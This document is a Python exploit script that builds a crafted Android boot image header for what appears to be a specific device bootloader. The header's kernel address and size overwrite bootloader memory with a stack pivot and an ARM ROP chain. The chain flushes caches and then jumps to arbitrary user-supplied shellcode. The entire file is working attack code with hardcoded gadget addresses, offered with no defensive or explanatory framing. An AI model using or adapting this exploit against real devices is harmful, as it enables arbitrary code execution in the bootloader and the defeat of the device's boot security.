import sys
import struct

base = 0x4BD00000

# 0x000000000001843e : pop {pc}
pop_pc = base + 0x1843e|1

# 0x000000000002607a : blx r3 ; movs r0, #0 ; pop {r3, pc}
blx_r3_pop_r3 = base + 0x2607a|1

# 0x000000000004da0e : pop {r0, r1, r2, r3, r6, pc}
pop_r0_r1_r2_r3_r6_pc = base + 0x4da0e|1

cache_func = 0x4BD24E70

test_func = 0x4BD261A6|1 # prints "please make sure the image"

crafted_hdr_sz = 0x70
page_size = 4 # at least 4 for alignment
# NOTE: crafted_hdr_sz bytes before inject_addr become corrupt
# 2 * page_size bytes after inject_addr+inject_sz become corrupt
inject_addr = 0x4BD0037C
inject_sz = 0x200 - crafted_hdr_sz

#    3da28: e813e93c    ldmda   r3, {r2, r3, r4, r5, r8, fp, sp, lr, pc}
pivot = base + 0x3da28

def main():
    with open(sys.argv[1], "rb") as fin:
        orig = fin.read(0x400)
        fin.seek(0x800)
        orig += fin.read()

    hdr = b"ANDROID!" # magic
    hdr += struct.pack("<II", inject_sz, inject_addr - crafted_hdr_sz + page_size) # kernel_size, kernel_addr
    hdr += struct.pack("<IIIIIIII", 0, 0, 0, 0, 0, page_size, 0, 0) # ramdisk_size, ramdisk_addr, second_size, second_addr, tags_addr, page_size, unused, os_version
    hdr += b"\x00" * 0x10 # name
    hdr += b"bootopt=64S3,32N2,32N2 buildvariant=user" # cmdline
    hdr += b"\x00" * (crafted_hdr_sz - len(hdr))

    assert len(hdr) == crafted_hdr_sz

    # the body gets injected at inject_addr
    # size of the body will be inject_sz

    # we start injection from get_var_wrapper
    body = bytes.fromhex("084B10B57B441C6844B1DFF81CC0FC44DCF80030A446BDE8104060476FF0010010BD00BF")
    body += struct.pack("<II", 36, 30)  # offset to func ptr, offset to arg - set up to point right below
    body += struct.pack("<II", pivot, inject_addr + len(body) + 8 + 4 * 8)  # func ptr, func arg - right after this pack(), points at the end of ldm package
    # pivot args
    body += struct.pack("<IIIIIIIII", 0, 0, 0, 0, 0, 0, inject_addr + len(body) + 4 * 9, 0, pop_pc)  # r2, r3, r4, r5, r8, fp, sp, lr, pc
    # rop chain
    # clean dcache, flush icache, then jump to payload
    chain = [
        pop_r0_r1_r2_r3_r6_pc,
        -1,
        0x1000,
        0xDEAD,
        cache_func,
        0xDEAD,
        blx_r3_pop_r3,
        0xDEAD,
        -1
    ]
    shellcode_addr = inject_addr + len(body) + len(chain) * 4
    print("shellcode base = 0x{:X}".format(shellcode_addr))
    chain[1] = chain[-1] = shellcode_addr
    chain_bin = b"".join([struct.pack("<I", word) for word in chain])
    body += chain_bin

    # shellcode binary
    with open(sys.argv[2], "rb") as fin:
        shellcode = fin.read()
    body += shellcode

    body += b"\x00" * (inject_sz - len(body))

    assert len(body) == inject_sz

    hdr += body

    hdr += b"\x00" * (0x400 - len(hdr))
    assert len(hdr) == 0x400
    hdr += orig

    with open(sys.argv[3], "wb") as fout:
        fout.write(hdr)


if __name__ == "__main__":
    main()
